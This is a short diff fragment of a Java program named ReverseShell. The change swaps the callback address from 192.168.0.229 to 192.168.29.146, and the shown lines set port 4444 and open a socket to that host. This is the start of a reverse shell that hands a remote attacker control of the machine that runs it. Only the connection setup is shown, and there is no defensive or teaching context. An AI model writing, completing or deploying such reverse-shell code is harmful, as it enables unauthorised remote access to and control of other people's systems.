@@ -3,7 +3,7 @@ import java.net.*;
 
 public class ReverseShell {
     public static void main(String[] args) {
-        String host = "192.168.0.229";
+        String host = "192.168.29.146";
         int port = 4444;
         try {
             Socket socket = new Socket(host, port);
